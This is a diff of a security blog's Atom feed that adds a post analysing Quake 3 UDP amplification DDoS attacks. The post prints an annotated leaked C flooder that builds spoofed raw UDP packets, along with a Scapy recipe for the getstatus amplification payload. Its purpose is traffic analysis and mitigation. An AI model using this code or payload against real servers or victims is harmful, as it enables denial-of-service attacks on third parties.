@@ -4,7 +4,7 @@
   <title><![CDATA[Category: networking | Alejandro Nolla - z0mbiehunt3r]]></title>
   <link href="http://blog.alejandronolla.com/blog/categories/networking/atom.xml" rel="self"/>
   <link href="http://blog.alejandronolla.com/"/>
-  <updated>2013-06-09T15:32:36+02:00</updated>
+  <updated>2013-06-24T15:01:26+02:00</updated>
   <id>http://blog.alejandronolla.com/</id>
   <author>
     <name><![CDATA[Alejandro Nolla]]></name>
@@ -12,6 +12,320 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Amplification DDoS attack with Quake3 servers: An analysis (1/2)]]></title>
+    <link href="http://blog.alejandronolla.com/2013/06/24/amplification-ddos-attack-with-quake3-servers-an-analysis-1-slash-2/"/>
+    <updated>2013-06-24T13:52:00+02:00</updated>
+    <id>http://blog.alejandronolla.com/2013/06/24/amplification-ddos-attack-with-quake3-servers-an-analysis-1-slash-2</id>
+    <content type="html"><![CDATA[<h2>Introduction</h2>
+
+<p>Lately has been growing in popularity those DDoS attacks based on <a href="http://www.us-cert.gov/ncas/alerts/TA13-088A">DNS Amplification</a>, specifically due to the <a href="http://blog.cloudflare.com/the-ddos-that-almost-broke-the-internet">attack</a> to Spamhaus. While this kind of attack is becoming more and more popular at DDoS scenarios there are others types of DDoS techniques being used not so common and which should be known before being hitted by them. In this post i want to introduce amplification attacks using Quake 3 network protocol - UDP based - as well as how to analyze it in several ways to really understand it in depth to find a pattern and create a fingerprint for trying mitigating them. <!-- more --></p>
+
+<h2>How does this attack works</h2>
+
+<p>This kind of DDoS is very similar to a DNS Amplification Attack, an attacker send thousands of UDP datagrams pretending to be a legitimate Quake 3 client asking for game status with source IP address spoofed using the one wanted to be flooded, then, queried Quake 3 servers will answer with game status - including some server configuration options and user list - to spoofed source IP address, flooding it with thousands of unsolicited UDP datagrams.</p>
+
+<p>I have done a basic draw for illustrating it:<br/>
+<img src="/images/upload/2013/06/quake3_ddos.png"></p>
+
+<p>As shown, amplifiers servers - Quake 3 ones - will flood victim with an aggregated throughput much higher than the used by attacker (hence it "amplifier" term); lets see some traffic generated if we make this "getstatus" request:<br/>
+``` bash showing some info about getstatus request with tshark
+$ tshark -r udp_quake3_reflected_clean.pcap.cloaked -z conv,udp
+  1   0.000000 192.168.1.39 -> 128.66.0.59  QUAKE3 56 Connectionless Client to Server</p>
+
+<h1>  2   0.213635  128.66.0.59 -> 192.168.1.39 QUAKE3 1373 Connectionless Server to Client</h1>
+
+<p>UDP Conversations
+Filter:<No Filter></p>
+
+<pre><code>                                           |       &lt;-      | |       -&gt;      | |     Total     |
+                                           | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |
+</code></pre>
+
+<h1>192.168.1.39:32511   <-> 128.66.0.59:27960          1      1373       1        56       2      1429</h1>
+
+<p>```</p>
+
+<p>If we calculate amplification ratio we find that sending an UDP datagram of 56 bytes will trigger a response of 1373 bytes, achieving about x24,5 amplification ratio, not bad after all.</p>
+
+<h2>Installing Quake 3 server (amplifier)</h2>
+
+<p>We are going to need a Quake 3 server for being used as "amplifier" to attack our victim when doing some local tests, so we are going to need an original copy of Quake 3 and compiling <a href="http://ioquake3.org/">ioquake3</a>, an open source Quake 3 engine based on id Software source code (publicly released in 2005).<br/>
+``` bash installing prerequisites and ioquake3 server</p>
+
+<h1>apt-get install libsdl1.2-dev -y</h1>
+
+<p>~$ git clone git://github.com/ioquake/ioq3.git
+~$ cd ioq3/
+~/ioq3$ make
+```</p>
+
+<p>Now we need to copy Quake 3 original pak files (those with models and textures) from our cdrom to our hdd prior being able to run an ioq3 server:
+``` bash copying pak files to our hdd and starting ioq3 server
+~$ mkdir .baseq3
+/quake3/baseq3$ cp *.pk3 /home/z0mbiehunt3r/.q3a/baseq3
+~$ # now start server
+~/ioq3/build/release-linux-x86_64$ ./ioq3ded.x86_64 +set net_ip YOUR_LAN_IP +map q3dm1
+ioq3 1.36_GIT_7b15415-2013-06-10 linux-x86_64 Jun 15 2013
+Have SSE support
+[...]
+Hunk_Clear: reset the hunk ok
+--- Common Initialization Complete ---
+IP: 127.0.0.1
+IP: 192.168.1.39
+Opening IP socket: 192.168.1.39:27960
+[...]
+------------ Map Loading ------------
+trying to load maps/q3dm1.aas
+loaded maps/q3dm1.aas</p>
+
+<h2>found 18 level items</h2>
+
+<p>32 bots parsed
+35 arenas parsed</p>
+
+<h2>AAS initialized.</h2>
+
+<p>]
+```</p>
+
+<p>Our ioq3 server is ready to make some frags!, we can check it with <a href="http://nmap.org/nsedoc/scripts/quake3-info.html">quake3-info.nse</a> script:<br/>
+``` bash scanning our Quake 3 server with nmap</p>
+
+<h1>./nmap -sU -p27960 -Pn -n 192.168.1.39 --reason --script=quake3-info</h1>
+
+<p>Starting Nmap 6.26SVN ( http://nmap.org ) at 2013-06-16 00:23 CEST
+Nmap scan report for 192.168.1.39
+Host is up, received user-set (0.00021s latency).
+PORT      STATE SERVICE REASON
+27960/udp open  quake3  udp-response
+| quake3-info:
+|   BASIC OPTIONS:
+|     capturelimit: 8
+|     dmflags: 0
+|     fraglimit: 20
+|     gamename: baseq3
+|     mapname: q3dm1
+|     timelimit: 0
+|     version: ioq3 1.36_GIT_7b15415-2013-06-10 linux-x86_64 Jun 15 2013
+|   OTHER OPTIONS:
+|     bot_minplayers: 0
+|     com_gamename: Quake3Arena
+|     com_protocol: 71
+|     g_gametype: 0
+|     g_maxGameClients: 0
+|     g_needpass: 0
+|     sv_allowDownload: 0
+|     sv_dlRate: 100
+|     sv_floodProtect: 1
+|     sv_hostname: c0meG3tS0m3
+|     sv_maxPing: 0
+|     sv_maxRate: 0
+|     sv_maxclients: 8
+|     sv_minPing: 0
+|     sv_minRate: 0
+|_    sv_privateClients: 0
+Service Info: OS: Linux</p>
+
+<p>Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
+```</p>
+
+<h2>Analyzing attackers script</h2>
+
+<p>Commonly used scripts for this kind of attacks has been leaked repeatedly so i'm not going to hide it (regardless of the fact those who DDoS already have it or more powerful attack vectors), so <a href="/images/upload/2013/06/udp.c">here</a> is a C Quake 3 amplification flooder made upon a generic UDP flooder.</p>
+
+<p>It's interesting the way UDP datagrams are assembled, so let's go to analyze it (thanks to <a href="https://twitter.com/NighterMan">NighterMan‎</a> for helping me with my rusted C knowledge), i have made some comments below about found mistakes, particularly at networking knowledge (the tool doesn't even work rigth to trigger amplified response):<br/>
+``` c Quake 3 DDoS amplification attack function
+[...]
+// this is the UDP payload for "geststatus" message
+param.message = "\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10";
+[...]</p>
+
+<p>/<em>
+attack function is called with following args, being params->list[i].ip and params->list[i].port Quake 3 server data
+attack(params->victim_ip, rand() % 65534 + 1, params->list[i].ip, params->list[i].port, params->message);
+</em>/</p>
+
+<p>void attack(unsigned long srcip, int srcport, unsigned long destip, int destport, char *message)
+{</p>
+
+<pre><code>/*
+When sending TCP/UDP packets/datagrams with raw sockets we need a pseudo header to calculate checksum value,
+not used in this case and probably forgot when ripping it from this SYN flooder
+https://gist.github.com/z0mbiehunt3r/5790220
+*/
+struct pseudo_header psh;
+
+sin.sin_family = AF_INET;
+sin.sin_port = htons(destport);
+sin.sin_addr.s_addr = destip;
+
+memset (packet, 0, 4096);
+
+/*
+To read more about Internet Header Length and Type Of Service check rfc791
+https://tools.ietf.org/html/rfc791#page-11
+*/
+iph-&gt;ihl = 5;
+iph-&gt;version = 4;
+
+/*
+Actually ToS field in IP header is made up of a six bit "Differentiated services field"
+and two bit "Explicit Congestion Notification" field.
+
+Read http://tools.ietf.org/html/rfc2474 and http://tools.ietf.org/html/rfc3168 about them
+
+Explicit Congestion Notification set as a Not ECN-Capable Transport, probably with intention
+of bypassing/messing around congestion mitigation mechanisms ;)
+*/
+iph-&gt;tos = 16;
+
+iph-&gt;tot_len = sizeof (struct ip) + sizeof (struct udphdr) + strlen(message);
+// htonl will produce a long instead of a short (IPID value is 16 bits), kernel will fix this value
+iph-&gt;id = htonl (54321); 
+iph-&gt;frag_off = 0;
+iph-&gt;ttl = 255;
+iph-&gt;protocol = IPPROTO_UDP;
+// rely IP header checksum to kernel
+iph-&gt;check = 0; 
+iph-&gt;saddr = srcip; 
+iph-&gt;daddr = sin.sin_addr.s_addr;
+
+udph-&gt;source = htons(srcport);
+udph-&gt;dest = htons(destport);
+
+/*
+As specified at rfc768: "Length is the length in octets of this user datagram including this header
+and the data. (This  means  the minimum value of the length is eight.)"
+
+Above is UDP length computed withoud having in mind UDP payload, so it will be wrong, DPI and protocol 
+anomaly detection are more than welcome ;)
+
+Additionally, specifying a bad UDP length have an important side effect in this flooder, it won't work
+because upper layers are not going to receive correct payload, in this case quake3 server will answer
+with a disconnect command instead of server' status, so no amplification
+*/
+udph-&gt;len = htons(sizeof(struct udphdr));
+
+/*
+As specified at rfc768: "An all zero  transmitted checksum  value means that the transmitter
+generated  no checksum  (for debugging or for higher level protocols that don't care)."
+
+could be useful sometimes when defining attacking patterns
+*/
+udph-&gt;check = 0;
+
+strncpy((char *)udph + sizeof (struct udphdr),message, 4096 - (sizeof (struct udphdr) + sizeof (struct ip)));
+
+int one = 1;
+const int *val = &amp;one;
+if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) &lt; 0)
+{
+    printf ("[x] Cannot set socket options (are we r00t?)\n");
+    return;
+}
+
+if (sendto (s, packet, iph-&gt;tot_len, 0, (struct sockaddr *) &amp;sin, sizeof (sin)) &lt; 0)
+    printf ("[x] Error sending packet\n");
+
+close(s);
+return;
+</code></pre>
+
+<p>}
+```</p>
+
+<p>There isn't much more to say about this, just highlight the fact that using htonl() instead of htons() avoid us using fixed IP ID value when finding an attack pattern. Also found interesting the specified IP ToS value to mess around with congestion detection and avoidance mechanisms, but contrasts with some mistakes that make easier to spot attacking datagrams generated by this tool and, even more unvelievable, incorrect UDP length transform amplification attack just in a plain UDP spoofed attack (probably made some copy paste from here and there), seems some guys need to read a bit about network protocols before playing with DDoS tools...</p>
+
+<h2>Crafting Quake 3 amplification attack packet with Scapy</h2>
+
+<p>Probably the quick and easiest way to craft packets when doing network tests is <a href="http://www.secdev.org/projects/scapy/">Scapy</a>, a python tool to create and manipulate network packets that can be used within his own interactive shell or just as a python package.</p>
+
+<p>Below is an example for crafting this kind of attack with scapy, without spoofing IP address (we want to check answer) and with a correct UDP length value and checksum (scapy will automagically compute values like length and checksum prior of sending any packet):<br/>
+``` python crafting Quake 3 amplification attack packet with scapy</p>
+
+<h1>scapy</h1>
+
+<blockquote><blockquote><blockquote><p>import random</p>
+
+<p>ip = IP(dst="QUAKE3_SERVER_IP", ihl=5, tos=0x10, ttl=255, id=random.randint(0, 0xFFFF))
+udp = UDP(sport=32511, dport=27960)
+quake3_payload = '\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10'
+packet = ip/udp/quake3_payload # encapsulate them
+packet.show2()</p>
+
+<h3>[ IP ]</h3>
+
+<p>  version= 4L
+  ihl= 5L
+  tos= 0x10
+  len= 42
+  id= 5944
+  flags=
+  frag= 0L
+  ttl= 255
+  proto= udp
+  chksum= 0xe0a9
+  src= 192.168.1.39
+  dst= QUAKE3_SERVER_IP
+  \options\</p>
+
+<h3>[ UDP ]</h3>
+
+<pre><code> sport= 32511
+ dport= 27960
+ len= 22
+ chksum= 0x17f9
+</code></pre>
+
+<h3>[ Raw ]</h3>
+
+<pre><code>    load= '\xff\xff\xff\xffgetstatus\x10'
+</code></pre>
+
+<p>response = sr1(packet)
+Begin emission:
+Finished to send 1 packets.
+*
+Received 1 packets, got 1 answers, remaining 0 packets</p>
+
+<p>response.payload.payload.show2()</p>
+
+<h3>[ Raw ]</h3>
+
+<p>  load= '\xff\xff\xff\xffstatusResponse\n\sv_allowdownload\0\g_matchmode\0\g_gametype\3\sv_maxclients\32\sv_floodprotect\1\capturelimit\0\[...]\n0 0 "Chuck-Norris"\n0 250 "b0b0"[...]</p>
+
+<p>```</p></blockquote></blockquote></blockquote>
+
+<p>If you have never used scapy before take a look to this <a href="http://code.google.com/p/scapy-guide/downloads/list">scapy-guide</a> made by <a href="https://twitter.com/catalyst256/">Adam Maxwell</a>, it's really useful as a first-steps guide.</p>
+
+<h2>How does it looks like at network level?</h2>
+
+<p>Ok, so we have readed flooder code and referenced rfc sections (because we did, right? ;) ), time to sniff some attack traffic and analyze it with tshark/wireshark and observe described behaviour pattern.</p>
+
+<p>First, i have compiled and used "dns.c" flooder without making any kind of modification, this is a Wireshak screenshot while analyzing it:<br/>
+<img src="/images/upload/2013/06/incorrectlength_client.png"></p>
+
+<p>I have marked in red important aspects like ToS/DS field, UDP length/checksum and "direction" (for Quake 3 protocol). As shown, Wireshark Quake 3 protocol <a href="http://anonsvn.wireshark.org/wireshark/trunk/epan/dissectors/packet-quake3.c">dissector</a> itself detect it as a malformed packet, due to UDP length = 8 application layer will receive an empty payload, fact that the Q3 server will treat as a client with connectivity errors and will send a "disconnect" message:<br/>
+<img src="/images/upload/2013/06/incorrectlength_server.png"></p>
+
+<p>If we compare question size against response answer there is no amplification factor at all, this program would be useful only for provoking Q3 servers sending unsolicited traffic to a third host - the attacked one - with the intention of splitting originating AS-path attacking or something similar.</p>
+
+<p>I have sent one "getstatus" request forged with scapy to a public Quake 3 server (for obvious reasons i have changed some response content):<br/>
+<img src="/images/upload/2013/06/statusResponse.png"></p>
+
+<p>The server now correctly decode UDP payload, process "getstatus" command and answer with server status, including several server options and config values as well as statistics (a response size of 1373 bytes for a 56 bytes request).</p>
+
+<h2>Next steps</h2>
+
+<p>So far we have seen how this attack works as well as (bad coded) programs being used in the wild to launch DDoS attacks from web panels (the so called DDoS booters). We have also seen how to replay the amplification attack with Scapy and analized a bit of this network traffic with Wireshark.</p>
+
+<p>At the next post we are going to see how to mitigate this kind of attack at the Quake 3 server - at aplication and network layer - side and also from the victim side being flooded. Also we are going to analyze it deeper with tshark to see potential ways to spot this attack and try to block it.</p>
+
+<p>See you at next post!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Moloch: Erasing data and restore database]]></title>
